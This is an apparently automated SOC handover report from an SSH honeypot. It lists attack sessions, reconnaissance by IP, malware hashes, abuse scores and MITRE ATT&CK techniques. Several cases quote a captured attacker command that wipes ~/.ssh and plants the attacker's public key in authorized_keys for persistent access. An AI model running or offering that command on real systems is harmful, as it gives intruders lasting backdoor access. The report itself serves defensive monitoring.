### 🔴 HIGH · IR-779094d5ca02

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:39 |
| **Last Seen** | 2026-04-06 11:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:39:53` | `cowrie.session.connect` |
| `2026-04-06 11:39:53` | `cowrie.client.version` |
| `2026-04-06 11:39:53` | `cowrie.client.kex` |
| `2026-04-06 11:39:54` | `cowrie.login.success` |
| `2026-04-06 11:39:54` | `cowrie.session.params` |
| `2026-04-06 11:39:54` | `cowrie.command.input` |
| `2026-04-06 11:39:54` | `cowrie.command.failed` |
| `2026-04-06 11:39:54` | `cowrie.log.closed` |
| `2026-04-06 11:39:54` | `cowrie.session.params` |
| `2026-04-06 11:39:54` | `cowrie.command.input` |
| `2026-04-06 11:39:54` | `cowrie.session.file_download` |
| `2026-04-06 11:39:54` | `cowrie.log.closed` |
| `2026-04-06 11:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a0d50da5c7

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:39 |
| **Last Seen** | 2026-04-06 11:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:39:56` | `cowrie.session.connect` |
| `2026-04-06 11:39:56` | `cowrie.client.version` |
| `2026-04-06 11:39:56` | `cowrie.client.kex` |
| `2026-04-06 11:39:57` | `cowrie.login.success` |
| `2026-04-06 11:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-875754299892

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:43 |
| **Last Seen** | 2026-04-06 11:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:43:57` | `cowrie.session.connect` |
| `2026-04-06 11:43:57` | `cowrie.client.version` |
| `2026-04-06 11:43:57` | `cowrie.client.kex` |
| `2026-04-06 11:43:57` | `cowrie.login.success` |
| `2026-04-06 11:43:58` | `cowrie.session.params` |
| `2026-04-06 11:43:58` | `cowrie.command.input` |
| `2026-04-06 11:43:58` | `cowrie.command.failed` |
| `2026-04-06 11:43:58` | `cowrie.log.closed` |
| `2026-04-06 11:43:58` | `cowrie.session.params` |
| `2026-04-06 11:43:58` | `cowrie.command.input` |
| `2026-04-06 11:43:58` | `cowrie.session.file_download` |
| `2026-04-06 11:43:58` | `cowrie.log.closed` |
| `2026-04-06 11:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb32f11c59d1

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:44 |
| **Last Seen** | 2026-04-06 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:44:00` | `cowrie.session.connect` |
| `2026-04-06 11:44:00` | `cowrie.client.version` |
| `2026-04-06 11:44:00` | `cowrie.client.kex` |
| `2026-04-06 11:44:00` | `cowrie.login.success` |
| `2026-04-06 11:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bac33a8bae5

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:46 |
| **Last Seen** | 2026-04-06 11:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:46:02` | `cowrie.session.connect` |
| `2026-04-06 11:46:02` | `cowrie.client.version` |
| `2026-04-06 11:46:03` | `cowrie.client.kex` |
| `2026-04-06 11:46:03` | `cowrie.login.success` |
| `2026-04-06 11:46:03` | `cowrie.session.params` |
| `2026-04-06 11:46:03` | `cowrie.command.input` |
| `2026-04-06 11:46:03` | `cowrie.command.failed` |
| `2026-04-06 11:46:03` | `cowrie.log.closed` |
| `2026-04-06 11:46:04` | `cowrie.session.params` |
| `2026-04-06 11:46:04` | `cowrie.command.input` |
| `2026-04-06 11:46:04` | `cowrie.session.file_download` |
| `2026-04-06 11:46:04` | `cowrie.log.closed` |
| `2026-04-06 11:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f5c5a795e7

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:46 |
| **Last Seen** | 2026-04-06 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:46:06` | `cowrie.session.connect` |
| `2026-04-06 11:46:06` | `cowrie.client.version` |
| `2026-04-06 11:46:06` | `cowrie.client.kex` |
| `2026-04-06 11:46:06` | `cowrie.login.success` |
| `2026-04-06 11:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.56.30[.]33` | **25** | 2026-04-06 10:58 | 2026-04-06 11:42 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.18.197[.]35` | **25** | 2026-04-06 10:58 | 2026-04-06 11:46 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.248.82[.]58` | **9** | 2026-04-06 10:55 | 2026-04-06 11:09 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.101[.]220` | **7** | 2026-04-06 12:01 | 2026-04-06 12:09 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `3.132.26[.]232` | **7** | 2026-04-06 12:33 | 2026-04-06 12:43 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `35.210.61[.]208` | **4** | 2026-04-06 10:54 | 2026-04-06 10:58 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `20.51.235[.]107` | **2** | 2026-04-06 12:19 | 2026-04-06 12:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.155[.]86` | 1 | 2026-04-06 11:02 | 2026-04-06 11:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.194.33[.]73` | 1 | 2026-04-06 12:49 | 2026-04-06 12:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `168.167.72[.]132` | 1 | 2026-04-06 10:57 | 2026-04-06 10:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.191.157[.]64` | 1 | 2026-04-06 10:58 | 2026-04-06 10:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.65.148[.]75` | 1 | 2026-04-06 12:17 | 2026-04-06 12:17 | 30s | 0 | `T1592` | 🟢 LOW |
| `3.81.224[.]7` | 1 | 2026-04-06 12:56 | 2026-04-06 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-04-06 11:34 | 2026-04-06 11:35 | 40s | 0 | `T1592` | 🟢 LOW |
| `5.187.35[.]142` | 1 | 2026-04-06 11:34 | 2026-04-06 11:34 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `59.36.78[.]66` | 1 | 2026-04-06 10:58 | 2026-04-06 10:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `123.194.33[.]73` | TW | kbro CO. Ltd. | **100** ⚠️ | 6 |
| `3.132.26[.]232` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `3.81.224[.]7` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 13 |
| `35.202.9[.]133` | US | Google LLC | **100** ⚠️ | 50 |
| `14.248.82[.]58` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 12 |
| `5.187.35[.]142` | NL | Amarutu Technology Ltd | **100** ⚠️ | 50 |
| `35.210.61[.]208` | BE | Google LLC | **100** ⚠️ | 50 |
| `154.18.197[.]35` | PH | EWS DS Networks Inc | **100** ⚠️ | 5 |
| `176.65.148[.]75` | NL | Pfcloud UG | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 120 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 71 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 52 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 26 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 26 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 10 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 142 cases |
| Tool 34  | Credential Extractor        | ✅ 133 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 52 priority case(s) shown individually · 16 recon entry/entries in table (7 group(s) consolidating 79 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-06T13:05:33Z_
